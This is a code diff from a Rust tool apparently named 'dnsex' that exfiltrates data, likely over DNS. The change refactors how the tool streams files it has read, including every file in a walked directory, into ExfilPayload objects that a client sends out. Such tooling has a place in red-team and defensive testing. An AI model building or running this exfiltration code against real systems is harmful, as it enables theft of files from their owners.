@@ -4,6 +4,7 @@ use error::DnsexError;
 use server::{Server, ServerConfig};
 use std::path::Path;
 use tokio::fs;
+use tokio::io::BufReader;
 use walkdir::WalkDir;
 
 mod client;
@@ -104,19 +105,25 @@ async fn main() -> Result<(), DnsexError> {
 
                 for entry in walk_dir.into_iter().filter_map(|e| e.ok()).filter(|e| e.file_type().is_file()) {
                     let entry_path = entry.path().display().to_string();
-                    let bytes = fs::read(&entry_path).await?;
+                    let file = fs::OpenOptions::new().read(true).open(&entry_path).await?;
+                    let size = file.metadata().await?.len();
+                    let bufreader = BufReader::new(file);
                     let payload = ExfilPayload {
                         filename: entry_path,
-                        data: bytes,
+                        bufreader,
+                        size,
                     };
 
                     let _ = client.send_payload(payload).await?;
                 }
             } else {
-                let bytes = fs::read(&path).await?;
+                let file = fs::OpenOptions::new().read(true).open(&path).await?;
+                let size = file.metadata().await?.len();
+                let bufreader = BufReader::new(file);
                 let payload = ExfilPayload {
                     filename: path.display().to_string(),
-                    data: bytes,
+                    bufreader,
+                    size,
                 };
 
                 let _ = client.send_payload(payload).await?;
